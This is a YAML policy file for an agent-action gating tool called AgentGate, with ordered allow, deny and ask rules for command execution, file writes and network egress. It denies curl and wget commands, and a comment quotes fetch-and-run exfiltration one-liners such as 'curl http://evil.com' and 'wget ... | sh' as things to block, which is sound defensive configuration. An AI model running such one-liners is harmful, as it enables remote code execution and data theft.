# AgentGate policy — ordered, first-match-wins.
#
# Each rule has a `match` (action + target_glob) and a `decision`
# (allow | deny | ask). The first rule whose match clause matches a gated
# action wins. Anything no rule matches falls through to `default`.
#
# Glob notes:
#   *   matches one path/host segment (filepath.Match semantics)
#   **  matches across segments (e.g. "$PWD/**")
#   a bare token (no wildcard) matches as a substring, so "registry.npmjs.org"
#   matches the egress target "registry.npmjs.org:443".

default: ask

rules:
  # --- exec: package installs and scripts the agent spawns ---------------
  # Allow installs from the trusted public registries without prompting.
  - match:
      action: exec
      target_glob: "*npm install*"
    decision: ask          # surface every install so you see what is pulled

  - match:
      action: exec
      target_glob: "*pip install*"
    decision: ask

  # Block the common curl|wget "fetch a remote script and run it" exfil/RCE
  # one-liners. NOTE: target_glob has NO `|` alternation — filepath.Match treats
  # `|` as a literal, so a single "*curl*|*sh*" rule only matches a command
  # containing that exact literal pipe sequence and silently misses a bare
  # `curl http://evil.com` or a `wget ... | sh`. List the patterns as SEPARATE
  # rules instead:
  - match:
      action: exec
      target_glob: "*curl*"
    decision: deny
  - match:
      action: exec
      target_glob: "*wget*"
    decision: deny

  # --- fs_write: CHECK/DRY-RUN-ONLY in this version -----------------------
  # The policy engine and `agentgate check --action fs_write` resolve these
  # rules, but AgentGate does not yet intercept an agent's actual writes at
  # runtime (runtime write interposition is roadmapped). We keep only the
  # documenting allow-scope rule and deliberately omit a blanket `deny fs_write`
  # here — a rule that pretends to confine writes it can't stop at runtime is a
  # false promise. Validate write rules with `agentgate check`; don't rely on
  # them firing on a live run yet.
  - match:
      action: fs_write
      target_glob: "$PWD/**"
    decision: allow
    scope: "$PWD"          # documents the intended write scope for `agentgate check`

  # --- net_egress: allow registries, gate everything else -----------------
  - match:
      action: net_egress
      target_glob: "registry.npmjs.org"
    decision: allow

  - match:
      action: net_egress
      target_glob: "pypi.org"
    decision: allow

  - match:
      action: net_egress
      target_glob: "github.com"
    decision: allow

  - match:
      action: net_egress
    decision: deny          # undeclared host -> blocked
